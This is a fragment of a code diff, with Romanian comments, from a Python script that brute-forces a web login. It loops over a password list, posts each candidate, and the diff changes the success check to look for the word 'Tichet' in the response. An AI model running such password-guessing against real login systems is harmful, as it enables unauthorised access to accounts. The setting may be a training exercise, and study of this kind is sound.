@@ -21,8 +21,8 @@ for pwd in passwords:
     # Trimitem cererea catre server
     response = requests.post(URL, data=data)
     
-    # Daca in raspuns NU mai apare cuvantul "Eroare", inseamna ca am intrat
-    if "Eroare" not in response.text:
+    # Daca in raspuns apare cuvantul "Tichet", inseamna ca am ajuns in dashboard
+    if "Tichet" in response.text:
         print(f"[!] SUCCES! Parola gasita este: {pwd}")
         break
     else:
